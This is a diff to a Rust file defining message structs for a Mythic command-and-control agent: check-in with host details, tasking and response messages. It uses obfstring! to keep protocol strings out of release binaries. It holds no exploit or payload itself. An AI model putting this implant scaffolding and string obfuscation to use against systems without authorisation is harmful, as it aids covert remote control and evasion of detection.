@@ -1,52 +1,43 @@
 //! Mythic 4.0 agent message types for plaintext communication.
 //!
-//! Field names and action strings follow the official specification.
-//! Fixed protocol strings are constructed via `obfstring!` so the literal
-//! does not appear in release binaries.
+//! All owned strings and vectors come from `alloc`. Fixed protocol strings
+//! are constructed with `obfstring!` so the literal does not appear in
+//! release binaries.
 
+use alloc::string::String;
+use alloc::vec::Vec;
+
+#[cfg(feature = "json")]
 use serde::{Deserialize, Serialize};
-use uuid::Uuid;
 
 /// Delegate entry for P2P forwarding (optional on any message).
-#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
+#[derive(Debug, Clone, PartialEq)]
+#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
 pub struct Delegate {
     pub message: String,
     pub c2_profile: String,
     pub uuid: String,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub new_uuid: Option<String>,
 }
 
 /// Check-in request (agent → Mythic).
-#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
+#[derive(Debug, Clone, PartialEq)]
+#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
 pub struct CheckinRequest {
     pub action: String,
     pub uuid: String,
-    #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub ips: Vec<String>,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub os: Option<String>,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub user: Option<String>,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub host: Option<String>,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub pid: Option<u32>,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub architecture: Option<String>,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub domain: Option<String>,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub integrity_level: Option<u32>,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub external_ip: Option<String>,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub encryption_key: Option<String>,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub decryption_key: Option<String>,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub process_name: Option<String>,
-    #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub delegates: Vec<Delegate>,
 }
 
@@ -54,7 +45,7 @@ impl CheckinRequest {
     pub fn new(payload_uuid: &str) -> Self {
         Self {
             action: obfstring!("checkin"),
-            uuid: payload_uuid.to_string(),
+            uuid: String::from(payload_uuid),
             ips: Vec::new(),
             os: None,
             user: None,
@@ -114,7 +105,8 @@ impl CheckinRequest {
 }
 
 /// Check-in response (Mythic → agent).
-#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
+#[derive(Debug, Clone, PartialEq)]
+#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
 pub struct CheckinResponse {
     pub action: String,
     pub id: String,
@@ -136,7 +128,8 @@ impl CheckinResponse {
 }
 
 /// Task delivered by Mythic.
-#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
+#[derive(Debug, Clone, PartialEq)]
+#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
 pub struct Task {
     pub command: String,
     pub parameters: String,
@@ -145,15 +138,13 @@ pub struct Task {
 }
 
 /// Get-tasking request (agent → Mythic).
-#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
+#[derive(Debug, Clone, PartialEq)]
+#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
 pub struct GetTaskingRequest {
     pub action: String,
     pub tasking_size: i32,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub get_delegate_tasks: Option<bool>,
-    #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub delegates: Vec<Delegate>,
-    #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub responses: Vec<TaskResponse>,
 }
 
@@ -174,30 +165,24 @@ impl GetTaskingRequest {
 }
 
 /// Get-tasking response (Mythic → agent).
-#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
+#[derive(Debug, Clone, PartialEq)]
+#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
 pub struct GetTaskingResponse {
     pub action: String,
-    #[serde(default)]
     pub tasks: Vec<Task>,
-    #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub delegates: Vec<Delegate>,
-    #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub responses: Vec<TaskResponseAck>,
 }
 
 /// Individual task response sent by the agent.
-#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Default)]
+#[derive(Debug, Clone, PartialEq, Default)]
+#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
 pub struct TaskResponse {
     pub task_id: String,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub user_output: Option<String>,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub completed: Option<bool>,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub status: Option<String>,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub error: Option<String>,
-    // Additional hooking fields can be added as needed (download, credentials, etc.)
 }
 
 impl TaskResponse {
@@ -225,20 +210,20 @@ impl TaskResponse {
 }
 
 /// Acknowledgement for a posted response.
-#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
+#[derive(Debug, Clone, PartialEq)]
+#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
 pub struct TaskResponseAck {
     pub task_id: String,
     pub status: String,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub error: Option<String>,
 }
 
 /// Post-response request (agent → Mythic).
-#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
+#[derive(Debug, Clone, PartialEq)]
+#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
 pub struct PostResponseRequest {
     pub action: String,
     pub responses: Vec<TaskResponse>,
-    #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub delegates: Vec<Delegate>,
 }
 
@@ -253,16 +238,10 @@ impl PostResponseRequest {
 }
 
 /// Post-response response (Mythic → agent).
-#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
+#[derive(Debug, Clone, PartialEq)]
+#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
 pub struct PostResponseResponse {
     pub action: String,
-    #[serde(default)]
     pub responses: Vec<TaskResponseAck>,
-    #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub delegates: Vec<Delegate>,
-}
-
-/// Helper to generate a fresh payload UUID.
-pub fn new_payload_uuid() -> String {
-    Uuid::new_v4().to_string()
 }
